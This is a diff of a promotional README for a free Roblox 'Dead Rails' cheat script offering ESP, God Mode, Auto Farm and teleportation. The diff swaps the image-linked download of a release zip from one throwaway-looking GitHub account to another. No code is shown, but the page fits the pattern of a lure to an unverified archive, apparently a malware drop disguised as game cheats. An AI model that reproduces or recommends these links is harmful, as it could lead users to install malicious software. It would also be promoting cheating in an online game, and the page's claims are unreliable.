@@ -3,10 +3,10 @@
 **Searching for the best working Roblox Dead Rails Script in 2025?** You’ve landed in the right place. This in-depth guide will show you how to get access to the most powerful and fully functional Dead Rails scripts that are 100% free and tested. Whether you're looking to unlock ESP, God Mode, Auto Farm, Teleportation, or a complete GUI menu – this article has everything you need to dominate the haunted train ride.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ---
